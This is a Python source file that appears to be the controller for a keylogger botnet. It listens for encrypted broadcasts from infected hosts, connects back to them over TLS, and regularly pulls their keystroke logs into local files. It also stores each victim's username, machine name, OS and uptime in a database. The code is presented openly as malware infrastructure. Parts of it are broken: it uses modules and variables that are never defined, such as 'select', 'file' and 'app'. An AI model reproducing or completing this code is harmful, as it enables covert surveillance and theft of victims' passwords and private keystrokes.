from socket import *
from time import sleep
from threading import Thread
from constants import *
from utils import Message_socket, Event, set_keepalive
import ssl
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from multiprocessing.pool import ThreadPool
import Tkinter
from ui import Application
from tinydb import TinyDB, Query

PRIVATE_KEY_FILE = "key.pem"
FETCH_INTERVAL = 5
THREADS = 32

private_key = RSA.import_key(open(PRIVATE_KEY_FILE).read())
cipher_rsa = PKCS1_OAEP.new(private_key)
hosts_sockets = {}
hosts_info = TinyDB("hosts_info.json")
pool = ThreadPool(processes=THREADS)


def fetch_file(host, on_file_fetched, update_hosts):
    """
    Fetch the keylog from a specified connected host

    Args:
        host: the IP of the host
        on_file_fetched: callback after fetching the file
        update_hosts: function to call to refresh the ui of the hosts in case the host disconnected
    """
    global hosts_sockets
    if host not in hosts_sockets.keys():
        return
    conn = hosts_sockets[host]
    try:
        conn.send_msg("send file")
        file = conn.recv_msg()
        with open(host + ".log", "a") as f:
            f.write(file)
        on_file_fetched(Event(host=host, file=file))
    except (timeout, error):
        conn.close()
        print host + " disconnected"
        del hosts_sockets[host]
        update_hosts(Event(hosts=hosts_sockets.keys()))


def fetch_files(on_file_fetched, get_fetch_interval, update_hosts):
    """
    Fetches the keylogs from all connected hosts

    Args:
        on_file_fetched: callback after fetching the file
        get_fetch_interval: function to retriebe the specified interbal in the UI
        update_hosts: function to call to refresh the ui of the hosts in case the host disconnected
    """
    global hosts_sockets, pool
    while True:
        print get_fetch_interval()
        pool.map(lambda host: fetch_file(
            host, on_file_fetched, update_hosts), hosts_sockets.keys())
        sleep(max(0, get_fetch_interval()))


def listen_to_hosts(update_hosts):
    """
    Listens for broadcasts made by clients and connects to them using its pribate key.

    Args:
        update_hosts: function to call to refresh the ui when connected to a new host
    """
    global HOST_PORT, BD_PORT, cipher_rsa, hosts_sockets
    broadcast = socket(AF_INET, SOCK_DGRAM)
    broadcast.bind(("", BD_PORT))
    inputs = [broadcast]

    while inputs:
        readable, writable, exceptional = select.select(inputs, [], inputs)
        for s in readable:
            if s is broadcast:
                data, addr = s.recvfrom(4096)
                ip = addr[0]
                decryptedData = cipher_rsa.decrypt(data)
                if decryptedData != ip:
                    continue
                if ip in hosts_sockets.keys():
                    continue
                conn = socket(AF_INET, SOCK_STREAM)
                set_keepalive(conn)
                try:
                    conn.connect((ip, HOST_PORT))
                    conn = ssl.wrap_socket(
                        sock=conn, certfile="cert.pem", keyfile="key.pem", server_side=True)
                except:
                    conn.close()
                else:
                    conn = Message_socket(_sock=conn)
                    conn.setblocking(0)
                    inputs.append(conn)
                    hosts_sockets[ip] = conn
                    print(ip + " connected")
                    update_hosts(Event(hosts=hosts_sockets.keys()))
            else:
                data = s.recv_json()
                if data:
                    host = s.getpeername()[0]
                    if "info" in data:
                        entries = ["user", "name", "os", "uptime"]
                        hosts_info.upsert(
                            dict({entry: data["info"][entry] for entry in entries if entry in data["info"]}, {"ip": ip}), Query().ip == host)
                        update_hosts(Event(hosts=hosts_sockets.keys()))
                    if "data" in data:
                        with open(host + ".log", "a") as f:
                            f.write(file)
                        on_file_fetched(Event(host=host, file=file))
                else:
                    print("no msg closing")
                    inputs.remove(s)
                    s.close()
        for s in exceptional:
            inputs.remove(s)
            s.close()


if __name__ == "__main__":
    Thread(target=listen_to_hosts, args=(app.update_hosts,)).start()